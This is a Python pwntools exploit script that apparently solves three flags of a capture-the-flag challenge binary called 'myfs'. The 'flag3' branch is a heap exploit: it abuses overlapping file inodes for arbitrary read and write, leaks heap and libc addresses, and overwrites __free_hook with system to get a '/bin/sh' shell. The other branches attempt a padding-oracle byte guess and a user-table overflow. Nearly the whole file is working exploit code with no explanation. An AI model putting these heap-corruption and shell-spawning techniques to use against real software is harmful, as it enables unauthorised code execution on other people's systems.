#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) != 3:
    exit(1)

r = None

def create_user(u, p):
    r.sendlineafter('> ', f"useradd {u} {p}")

def delete_user(u, p):
    r.sendlineafter('> ', f"userdel {u} {p}")

def login(u, p):
    r.sendlineafter('> ', f"login {u} {p}")

def create_normfile(fn):
    r.sendlineafter('> ', f"create normfile {fn}")

def create_dir(fn):
    r.sendlineafter('> ', f"create dir {fn}")

def delete_file(fn):
    r.sendlineafter('> ', f"rm {fn}")

def enc_file(fn):
    r.sendlineafter('> ', f"enc {fn}")

def dec_file(fn):
    r.sendlineafter('> ', f"dec {fn}")

def enter_dir(fn):
    r.sendlineafter('> ', f"cd {fn}")

def _info(fn):
    r.sendlineafter('> ', f"info {fn}")

def read_file(fn, data):
    r.sendlineafter('> ', f"read {fn}")
    r.send(data)
    sleep(0.5)

def write_file(fn):
    r.sendlineafter('> ', f"write {fn}")

def set_prot_file(fn, prot):
    r.sendlineafter('> ', f"set {fn} {prot}")

def unset_prot_file(fn, prot):
    r.sendlineafter('> ', f"unset {fn} {prot}")

def slss_file(fn):
    r.sendlineafter('> ', f"slss {fn}")

def slsd_file(fn):
    r.sendlineafter('> ', f"slsd {fn}")

def hlss_file(fn):
    r.sendlineafter('> ', f"hlss {fn}")

def hlsd_file(fn):
    r.sendlineafter('> ', f"hlsd {fn}")

if sys.argv[2] == 'flag3':
    for _ in range(0x40):
        try:
            if sys.argv[1] == 'remote':
                r = remote('owo', 1234)
            else:
                r = process('./myfs')

            for i in range(0xe):
                create_normfile(str(i))

            create_normfile('large_file')
            read_file('large_file', 0x408 * b'\x00')

            for i in range(0xe):
                delete_file(str(i))

            create_normfile('owo')
            read_file('owo', b'\x50\x3b')

            create_normfile('qaq')
            read_file('qaq', 0x18 * b'\x00')

            write_file('large_file') # overlap with inode of qaq
            r.recv(0x10)
            heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x18a0
            info(f"heap: {hex(heap)}")

            def aar(addr):
                data = (p64(0)*2 + p64(addr)).ljust(0x408, b'\x00')
                read_file('large_file', data)
                write_file('qaq')

            def aaw(addr, content):
                data = (p64(0)*2 + p64(addr)).ljust(0x408, b'\x00')
                read_file('large_file', data)
                read_file('qaq', content.ljust(0x18, b'\x00'))

            aar(heap + 0x890)
            libc = u64(r.recv(8)) - 0x2d0e00 - 0x1f2000
            __free_hook = libc + 0x1eeb28
            _system = libc + 0x55410
            info(f"libc: {hex(libc)}")
            aaw(heap + 0x10, p64(0x0000000100040000))
            aaw(__free_hook - 8, b'/bin/sh\x00' + p64(_system))

            for i in range(0xf):
                create_normfile(str(i))

            for i in range(0xf):
                delete_file(str(i))

            delete_file('qaq')
            r.interactive()
        except Exception as e:
            print(e)
elif sys.argv[2] == 'flag2':
    if sys.argv[1] == 'remote':
        r = remote('owo', 1234)
    else:
        r = process('./myfs')
    
    write_file('test_file_L1')
    cipher = r.recvuntil('/> ', drop=True)
    cipher = bytes.fromhex(cipher.decode())
    info(f"cipher: {cipher}")
    r.sendline(f"create normfile padding_oracle")

    flag = b''
    
    read_file('padding_oracle', 'XD')
    enc_file('padding_oracle')

    for bt in range(0xff):
        read_file('padding_oracle', cipher[:-1] + bytes([bt]))
        dec_file('padding_oracle')

        oracle = r.recv(3)
        if oracle != b'[-]':
            print(cipher[:-1] + bytes([bt]))
            break

    r.interactive()
elif sys.argv[2] == 'flag1':
    if sys.argv[1] == 'remote':
        r = remote('owo', 1234)
    else:
        r = process('./myfs')
    
    for i in range(0xfd):
        create_user(str(i), str(i))

    create_user('fuck', 'fuck')
    login('fuck', 'fuck')
    enter_dir('test_dir_L1')
    write_file('test_file2_L2')
    
    r.interactive()
else:
    exit(1)